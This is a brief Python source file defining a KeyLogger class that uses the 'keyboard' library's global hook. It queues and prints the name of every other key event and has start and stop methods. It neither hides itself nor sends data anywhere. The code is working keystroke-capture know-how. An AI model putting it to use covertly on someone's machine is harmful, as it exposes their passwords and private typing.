
from keyboard import hook, KeyboardEvent, unhook
from queue import Queue
import threading


class KeyLogger:
    def __init__(self):
        self.keys = Queue()
        self.callback = None
        self.odd = True

    def add(self, event: KeyboardEvent):
        if self.odd:
            self.keys.put(event.name)
            self.odd = False
            print(event.name)
        else:
            self.odd = True

    def start(self, callback=None):
        callback = callback if callback else self.add
        self.callback = hook(callback)

    def stop(self):
        if not self.callback:
            raise RuntimeError("the keylogger is already stopped")
        unhook(self.callback)
